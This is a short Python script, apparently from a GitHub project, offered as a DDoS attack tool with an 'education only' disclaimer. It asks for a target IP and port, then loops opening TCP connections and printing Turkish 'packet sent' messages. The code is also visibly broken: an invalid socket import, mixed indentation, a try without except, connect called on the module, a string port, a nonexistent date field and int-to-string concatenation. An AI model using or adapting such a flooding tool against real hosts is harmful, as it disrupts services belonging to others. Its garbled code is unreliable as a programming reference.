import os 
import sys
from socket import sck
import time 

def mainprogram():
	print("hello, what do you want?\n")
	print("[1] starting ddos attacks")
	print("[2] leave from program")
	print("\n\n")
	print("programmer : github.com/staticsploit    Ege İşli")
	print("source code : github.com/staticsploit/ddosattacker")
	print("WARNING : this code is just for education!!!\n\n")
	print("You can use it to see that your server is visible")
    a = input("answer >")
    answer = str(a)
    if(answer == "1"):
    	print("[+] okay, for this, we need some information\n")
    	target = input("[?] what is target ip >")
    	port = input("[?] which port do you want to use >")
    	print("\n\n[+] Okay, it is starting...")
    	print("[+] if you want to finish it, just make ctrl+c")
    	s = sck.socket(sck.AF_INET, sck.SOCK_STREAM)
    	while True:
    		try:
    			sck.connect((target, port))
    			tarih = time.gmtime(0)
    			saat = time.localtime()

    			print("[+] tarih : "+tarih.tm_year+"/"+tarih.tm_mon+"/"+tarih.tm_day+" saat : "+saat.tm_hour+" "+saat.tm_min+" "+saat.tm_sec+" paket gönderildi.")
    		else:
    			print("[-] başarısız...")

    elif(answer == "2"):
    	exit()
